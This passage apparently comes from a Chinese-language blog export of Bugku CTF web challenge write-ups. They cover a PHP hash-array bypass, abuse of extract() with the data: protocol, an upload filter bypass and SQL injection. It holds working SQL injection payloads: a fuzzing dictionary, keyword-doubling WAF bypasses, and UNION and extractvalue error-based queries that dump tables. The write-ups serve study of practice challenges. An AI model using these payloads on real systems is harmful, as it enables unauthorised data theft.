<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/3.png" class="">

<p>修改IP报头就算了，太菜了懒得写了</p>
<p>拿下flag，睡觉</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题考察HTTP协议头</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>各种绕过</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/1.png" class="">

<p>源码审计题</p>
<a id="more"></a>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]); <span class="comment">// 对id参数URL解码</span></span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// uname和passwd必须存在且不能相同</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// uname和passwd的sha1值相同并且id参数值为margin则输出flag</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>]) &amp; ($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总计一下：跟矛盾和备份这两道题神似，本题考察的是不同的数但sha1值相同</p>
<p><strong>注意：uname和passwd的参数值来源，真的是应该去看看眼睛了</strong></p>
<h2 id="解决之道"><a href="#解决之道" class="headerlink" title="解决之道"></a>解决之道</h2><p>记得MD5的时候说过PHP散列函数无法处理数组，懂了吧</p>
<p>解决完眼xia和脑子瓦特之后，开始构造payload注入</p>
<p>GET参数：uname[]=1&amp;id=%6D%61%72%67%69%6E</p>
<p>POST参数：passwd[]=2</p>
<p>提交方式：POST</p>
<p>一顿操作猛如虎，提交一下，flag快到碗里来</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/2.png" class="">

<p>这？？？脸疼的厉害，不应该翻车的啊，换个工具试试</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/3.png" class="">

<p>我就说嘛，鄙人的思路肯定是对的，BUT用BP为什么不行？</p>
<h2 id="排忧解难"><a href="#排忧解难" class="headerlink" title="排忧解难"></a>排忧解难</h2><p>用BP抓一下maxhackbar的包，对比一下终于知道问题在哪了，我是213</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/4.png" class="">

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>基础无小事，记了总是忘，忘了就采坑，疼了还要记</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web8</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/1.png" class="">

<p>给了一段提示：txt？？？？</p>
<a id="more"></a>

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/2.png" class="">

<p>代码审计题</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 重点：extract函数将键值数组转换为变量</span></span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ac非空</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac)) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将$fn文件内容拷贝给$f</span></span><br><span class="line">    $f = trim(file_get_contents($fn));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果$ac值和$fn文件内容一致则输出flag</span></span><br><span class="line">    <span class="keyword">if</span> ($ac === $f) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> . <span class="string">&quot; $flag&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下：经过extract函数解析后，如果$ac值和$fn文件内容一致则输出flag</p>
<h2 id="开始探索"><a href="#开始探索" class="headerlink" title="开始探索"></a>开始探索</h2><p>现在问题是：我们怎么能确定文件内容呢？</p>
<p>&emsp;&emsp;当时我（笨比）的想法是：找一个能确定内容的文件，于是灵光一闪，七窍接通，突然想到会不会存在其他的小文件，紧接着扫了一下目录。。。。</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/3.png" class="">

<p>还真有(我可真是太机智了)，访问flag.txt</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/4.png" class="">

<p>NICE啊，得到了具体的内容</p>
<p>可以构造payload了：ac=flags&amp;fn=flag.txt</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/5.png" class="">

<p>NICE啊，拿到了flag，不禁给自己鼓掌（当时膨胀的差点飞出宇宙）</p>
<h2 id="后续发展"><a href="#后续发展" class="headerlink" title="后续发展"></a>后续发展</h2><p>&emsp;&emsp;感觉这次无比顺利之后便开始研究其他解决方案，突然想到，页面的源码应该就是index.php的，这不就是一个可以确定内容的吗</p>
<p>于是乎，开始熟练地构造payload：ac=%3C%3F%70%68%70%0D%0A%65%78%74%72%61%63%74%28%24%5F%47%45%54%29%3B%0D%0A%69%66+%28%21%65%6D%70%74%79%28%24%61%63%29%29%0D%0A%7B%0D%0A%24%66+%3D+%74%72%69%6D%28%66%69%6C%65%5F%67%65%74%5F%63%6F%6E%74%65%6E%74%73%28%24%66%6E%29%29%3B%0D%0A%69%66+%28%24%61%63+%3D%3D%3D+%24%66%29%0D%0A%7B%0D%0A%65%63%68%6F+%22%3C%70%3E%54%68%69%73+%69%73+%66%6C%61%67%3A%22+%2E%22+%24%66%6C%61%67%3C%2F%70%3E%22%3B%0D%0A%7D%0D%0A%65%6C%73%65%0D%0A%7B%0D%0A%65%63%68%6F+%22%3C%70%3E%73%6F%72%72%79%21%3C%2F%70%3E%22%3B%0D%0A%7D%0D%0A%7D%0D%0A%3F%3E&amp;fn=index.php</p>
<p>但是这次无论怎么搞也失败，没办法看看其他大佬的思路</p>
<h2 id="惊世骇俗"><a href="#惊世骇俗" class="headerlink" title="惊世骇俗"></a>惊世骇俗</h2><p>不得不说我学过的都顺着呼吸离开了我的身体，瞻仰一下大佬的解决方案</p>
<p>利用data协议直接构造任何数据，666</p>
<p>data协议详细参考：<a href="https://www.cnblogs.com/liyongquan/p/8615928.html" alt="data协议" target="_blank">传送门</a></p>
<p>懂了吧，所以payload可以写成：ac=xxx&amp;fn=data:,xxx</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web8/6.png" class="">

<p>又快又方便，满分</p>
<p>惊不惊喜，刺不刺激？</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>记得第一次看见data协议是在HTML中表示img，虽然很简单但是。。关键时候你就想不到</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>细心</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/1.png" class="">

<p>看见细心二字我直接心细了（你品，领悟一下中华文化的魅力）</p>
<p>同时提示了想办法搞到管理员权限</p>
<a id="more"></a>

<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/2.png" class="">

<p>主页直接404可还行</p>
<h2 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h2><p>404肯定是骗人的，不信你看看</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/3.png" class="">

<p>没啥思路，扫扫目录</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/4.png" class="">

<p>存在robots.txt，访问一下</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/5.png" class="">

<p>得到敏感文件：resusl.php，跟进访问</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/6.png" class="">

<p>看代码提示我们需要GET一个密码进去，由于有管理员等字样，自然地想到了admin</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E7%BB%86%E5%BF%83/7.png" class="">

<p>成功，拿下flag</p>
<h2 id="吐槽环节"><a href="#吐槽环节" class="headerlink" title="吐槽环节"></a>吐槽环节</h2><p>可以看到从2019年3月6号开始所有访问过的IP都被记录了，作者有点暴露个人信息了</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>渗透思路很重要</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>求getshell</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%82getshell/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%82getshell/1.png" class="">

<p>看这标题，猖狂至极，无法容忍</p>
<a id="more"></a>

<h2 id="开始进攻"><a href="#开始进攻" class="headerlink" title="开始进攻"></a>开始进攻</h2><p>首先伪装成良民，上传几个文件试试</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%82getshell/2.png" class="">

<p>发现只要是合法的后缀都会被统一命名为xxx.jpg，可以说基本无法绕过</p>
<h2 id="寻求外援"><a href="#寻求外援" class="headerlink" title="寻求外援"></a>寻求外援</h2><p>既然自己知识有限，那就靠万能的Internet吧，果然在我的一番搜索之下发现了解决办法</p>
<p>首先来学习一下：<a href="https://www.cnblogs.com/0yst3r-2046/p/10980420.html" alt="" target="_blank">传送门</a></p>
<p>原来的资料找不到了，简要说明一下吧</p>
<p>Content-Type(HTTP header)制定了POST数据的编码方式，同时也指明了与后台的协作方式，不过有一个缺陷就是名称必须完全相同（即大小写敏感），所以修改任意字母即可绕过验证机制</p>
<p>本题中我们先修改Content-Type(HTTP header)中的任意字母大小写，然后逐一尝试后缀</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E6%B1%82getshell/3.png" class="">

<p>最终后缀为php5时得到flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>我个人觉得这道题出稍微有点瑕疵</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>insert_into注入</title>
    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><p>作者终于有良心了，不好意思直接给源码就说是Python的</p>
<a id="more"></a>

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/1.png" class="">

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/insert-into%E6%B3%A8%E5%85%A5/2.png" class="">

<p>结合效果来看源码就是index的</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ip = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 读取IP，先尝试读取X-Forwarded-For字段，如果为空则使用源IP</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重点：以逗号切割IP并且返回第一个子串，也就是说第一个逗号之后的内容会被截断</span></span><br><span class="line">    $ip_arr = explode(<span class="string">&#x27;,&#x27;</span>, $ip);</span><br><span class="line">    <span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$pass = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$db = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to select database&quot;</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;your ip is :&#x27;</span> . $ip;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将IP插入到数据库中，只能时间盲注</span></span><br><span class="line">$sql = <span class="string">&quot;insert into client_ip (ip) values (&#x27;$ip&#x27;)&quot;</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总计一下：以逗号对XFF头进行截断然后插入到数据库中</p>
<h2 id="摸索注入"><a href="#摸索注入" class="headerlink" title="摸索注入"></a>摸索注入</h2><p>既然是以逗号作为截断符，payload中就不能使用逗号了，对于一些常用的时间盲注函数也就不能按照传统方式调用了</p>
<p>采用的无逗号方案：</p>
<ul>
<li><p>采用case when 代替if进行时间盲注</p>
</li>
<li><p>采用substr([str] from [from] for [len])来代替传统方式</p>
</li>
<li><p>用limit [len] offset [offset] 代替 limit [offset],[len]</p>
</li>
</ul>
<p>解决了逗号的问题接下来就可以放心的注入了</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>由于时间盲注非常考验耐心所以手工测试行不通，准备Python吧</p>
<p>首先说明一下，有些WP上来就猜到了flag在flag表的flag列，首先这确实是做多了CTF的经验，不过从SQL注入角度来说直接猜还是略显不足的，所以我们还是从头开始编写脚本逐步探测数据库，数据表，字段最后提取行数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="comment"># 脚本丢了，稍后发吧</span></span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>绕过WAF和脚本编写能力很重要</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>多次</title>
    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/1.png" class="">

<p>提示有两个flag</p>
<a id="more"></a>

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/2.png" class="">

<p>感觉像经典的SQL注入</p>
<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><p>鉴于本题逼近末尾，且分值比较高，绝对会有WAF，所以手工测试很难受，上fuzz</p>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol>
<li><p>手工测试一下，发现页面只有正确结果和Error两种情况，且数值固定</p>
</li>
<li><p>明确常见的WAF(CTF专用版)的过滤机制</p>
</li>
</ol>
<ul>
<li>过滤敏感字符：单双引号、括号等等</li>
<li>过滤关键词：AND、OR、UNION、SELECT等</li>
<li>很少用正则匹配恶意数据</li>
</ul>
<p>基于此，给出一个简单的测试字典，主要测试过滤关键字词以及是否大小写敏感</p>
<p>1– -<br>1’– -<br>1”– -<br>1’)– -<br>1”)– -<br>1 AND 1– -<br>1 AnD 1– -<br>1 AandND 1– -<br>1’ AND 1– -<br>1’ AnD 1– -<br>1’ AandND 1– -<br>1” AND 1– -<br>1” AnD 1– -<br>1” AandND 1– -<br>1’) AND 1– -<br>1’) AnD 1– -<br>1’) AandND 1– -<br>1”) AND 1– -<br>1”) AnD 1– -<br>1”) AandND 1 – -</p>
<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p>BP启动，intruder走起</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/3.png" class="">

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/4.png" class="">

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/5.png" class="">

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/6.png" class="">

<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>仔细分析返回结果可以发现</p>
<ol>
<li>发生错误的页面payload中均包含单引号</li>
<li>WAF从参数中剔除了关键词(对比9、10、11行)</li>
</ol>
<p>基于分析结果，再次测试闭合方式是否为单引号</p>
<p>payload：</p>
<ul>
<li>0’OorR’1</li>
<li>1’AandND’0</li>
<li>1’AandND’1</li>
</ul>
<p>可以确定闭合方式是单引号，同时确定了没有返回结果时会报Error</p>
<p>顺带测试一下需要用到的关键词：UNION SELECT WHERE</p>
<h2 id="顺风顺水"><a href="#顺风顺水" class="headerlink" title="顺风顺水"></a>顺风顺水</h2><p>既然信息已经探测的足够多了，接下来就是正常的注入过程了</p>
<h3 id="探测字段及回显位置"><a href="#探测字段及回显位置" class="headerlink" title="探测字段及回显位置"></a>探测字段及回显位置</h3><p>payload：0’ UunionNION SselectELECT 1,2– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/7.png" class="">

<p>确定第二列回显</p>
<h3 id="探测当前数据库中的所有表"><a href="#探测当前数据库中的所有表" class="headerlink" title="探测当前数据库中的所有表"></a>探测当前数据库中的所有表</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(table_name) from infOorRmation_schema.tables where table_schema=database()– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/8.png" class="">

<p>flag1表相当可疑</p>
<h3 id="探测flag1表中所有的字段"><a href="#探测flag1表中所有的字段" class="headerlink" title="探测flag1表中所有的字段"></a>探测flag1表中所有的字段</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(column_name) from infOorRmation_schema.columns where table_schema=database() ANandD table_name=’flag1’– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/9.png" class="">

<h3 id="获取flag1表中所有的行"><a href="#获取flag1表中所有的行" class="headerlink" title="获取flag1表中所有的行"></a>获取flag1表中所有的行</h3><p>payload：0’ UNunionION SEselectLECT 1,group_concat(flag1,0x2d,address) from flag1;– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/10.png" class="">

<p>前面看着像base64，果断解码（别忘了排除连接符 - ），结果如下</p>
<p>flag1：好吧你会SQL注入</p>
<p>address：./Once_More.php</p>
<p>给出了另一个地址。</p>
<h2 id="再次征战"><a href="#再次征战" class="headerlink" title="再次征战"></a>再次征战</h2><p>访问Once_More.php</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/11.png" class="">

<p>不得不说，场面极度嚣张，既然提示了ID是1，尝试提交id参数</p>
<p>经过测试，发现id在1-7之间返回 I am here，反之返回nobody，典型的布尔盲注</p>
<h3 id="再次fuzz"><a href="#再次fuzz" class="headerlink" title="再次fuzz"></a>再次fuzz</h3><p>还是老套路，抓包intruder一把梭</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/12.png" class="">

<p>这回有意思了，直接报错（的确是没想到）</p>
<p>结合payload和报错，可以知道又是单引号闭合</p>
<p>但是测试了一下发现UNION SELECT过滤的死死的，直接回显看来无望了</p>
<h2 id="往事如烟"><a href="#往事如烟" class="headerlink" title="往事如烟"></a>往事如烟</h2><p>==，好像除了联合查询还可以用强制报错回显数据啊</p>
<p>果断构造经典的报错payload：1’ and extractvalue(1,concat(0x7e,database(),0x7e))– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/14.png" class="">

<p>YES，成功获取当前使用的数据库名称</p>
<p>Note：你问我为什么不用updatexml？因为updatexml有三个参数，而且第三个参数总是忘记。。。</p>
<h2 id="乘风破浪"><a href="#乘风破浪" class="headerlink" title="乘风破浪"></a>乘风破浪</h2><h3 id="探测当前数据库中所有的表"><a href="#探测当前数据库中所有的表" class="headerlink" title="探测当前数据库中所有的表"></a>探测当前数据库中所有的表</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/15.png" class="">

<h3 id="探测flag2表中所有的字段"><a href="#探测flag2表中所有的字段" class="headerlink" title="探测flag2表中所有的字段"></a>探测flag2表中所有的字段</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’flag2’),0x7e))– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/16.png" class="">

<h3 id="获取flag2表所有的行"><a href="#获取flag2表所有的行" class="headerlink" title="获取flag2表所有的行"></a>获取flag2表所有的行</h3><p>payload：1’ and extractvalue(1,concat(0x7e,(SELECT group_concat(flag2,0x26,address) FROM flag2),0x7e))– -</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E5%A4%9A%E6%AC%A1/17.png" class="">

<p>拿下flag，提交的时候却显示失败，此时突然想到了上次踩的坑，看了看题干，淡定的把字母都转换为小写，完美通过</p>
<h2 id="个人心得"><a href="#个人心得" class="headerlink" title="个人心得"></a>个人心得</h2><p>这道题出的很NICE，既锻炼纯手工注入能力，又要求对SQLI技术有较为全面的掌握，同时还可以训练一下fuzz；实战意义很大，建议多多思考练习</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>flag.php</title>
    <url>/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/1.png" class="">

<p>题干很重要，先记一记</p>
<a id="more"></a>

<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/2.png" class="">

<p>经典的登录框</p>
<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>根据标题和URL路径提示，习惯性的访问了一下flag.php发现存在且只有一行，很可能是flag变量的定义</p>
<p>为求谨慎，扫描了一下目录，发现只有index和flag两个页面</p>
<p>看看题干，首先说点了login为什么没反应，看看源码呗</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/3.png" class="">

<p>你个糟老头子坏得很，这要是有反应就见鬼了</p>
<p>看来这题要么就是爆破要么就是注入，为了方便起见我们先用BP自动修改HTML</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/4.png" class="">

<p>搞定之后BP就会自动替换内容，方便操作</p>
<p>接下来就是尝试时间了，爆破注入全都不好使，看来应该不是从这里入手</p>
<h2 id="陷入迷雾"><a href="#陷入迷雾" class="headerlink" title="陷入迷雾"></a>陷入迷雾</h2><p>题干的第一句话已经解决了（虽然没什么用）</p>
<p>看来破案的重点就是第二个提示：hint，这个单词究竟有什么深邃的含义呢？</p>
<p>就在万般无奈的时候，看了一眼桌上的A4纸，突然想到了一个单词：margin</p>
<p>记得以前的题目中margin是作为参数的，那么这次会不会也是</p>
<p>尝试提交hint参数</p>
<img src="/2020/09/08/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag_php/5.png" class="">

<p>这hint可真够劲，GOOD，GOOD，six six six</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">&quot;$KEY&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$flag&quot;</span>;</span><br><span class="line">&#125; <span 